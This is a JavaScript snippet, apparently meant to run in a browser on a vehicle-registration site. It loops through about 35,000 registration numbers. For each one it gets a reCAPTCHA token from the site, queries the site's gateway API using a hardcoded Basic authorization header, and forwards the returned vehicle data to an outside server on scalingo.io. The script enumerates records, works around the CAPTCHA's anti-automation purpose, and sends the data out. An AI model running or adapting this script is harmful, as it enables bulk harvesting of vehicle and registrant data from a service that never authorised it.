for (let mat = 190000; mat < 225000; mat++) {
  console.log('waiting')
  await new Promise(resolve => setTimeout(resolve, 3200))
  console.log('waited')
  grecaptcha.ready(function () {
    grecaptcha
      .execute('6LdMcKwaAAAAABaU3W61LYuBY7fT3NZ436Ndiipc', {
        action: 'getCarInfo'
      })
      .then(token => {
        $.ajax(
          '/api/gatewayclient/registration/' +
            mat +
            'RS' +
            '?vinverif=3C0KZ48658A300326',
          {
            type: 'GET',
            dataType: 'json',
            headers: {
              Authorization:
                'Basic NEhNTTZOTjJOVVBGSVpOMTNVSFVWVlhMN1cyQlpNMjE6',
              'captcha-token': token
            },
            success: function (data) {
              console.log('okkkkkkkkkkkkkkkkk')
              if (!data || data == '') {
                console.log('no response data')
              } else if (data.code && data.code != 200) {
                $.ajax(
                  'https://jsauto-api.osc-fr1.scalingo.io/car-regs/null/reg?reg=' +
                    mat +
                    'RS',
                  { type: 'GET', headers: { 'X-API-KEY': 'admin' } }
                )
              } else {
                $.ajax(
                  'https://jsauto-api.osc-fr1.scalingo.io/car-regs?car=' +
                    encodeURIComponent(JSON.stringify(data)),
                  { type: 'GET', headers: { 'X-API-KEY': 'admin' } }
                )
              }
            },
            error: function (XMLHttpRequest, textStatus, errorThrows) {
              console.log('Javascript error: ' + errorThrows)
            }
          }
        )
      })
  })
}
